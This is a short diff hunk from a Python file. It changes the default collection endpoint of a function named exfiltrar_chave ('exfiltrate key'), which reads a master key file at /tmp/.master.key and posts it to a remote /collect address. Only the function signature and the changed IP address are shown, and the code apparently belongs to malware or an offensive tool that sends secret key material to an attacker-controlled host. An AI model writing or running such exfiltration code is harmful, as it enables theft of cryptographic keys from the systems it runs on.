@@ -151,7 +151,7 @@ def _hostname() -> str:
 
 def exfiltrar_chave(
     key_path: str = "/tmp/.master.key",
-    endpoint: str = "http://10.150.3.162:8080/collect",
+    endpoint: str = "http://10.254.19.191:8080/collect",
     timeout: float = 10.0,
 ) -> bool:
     hostname = _hostname()
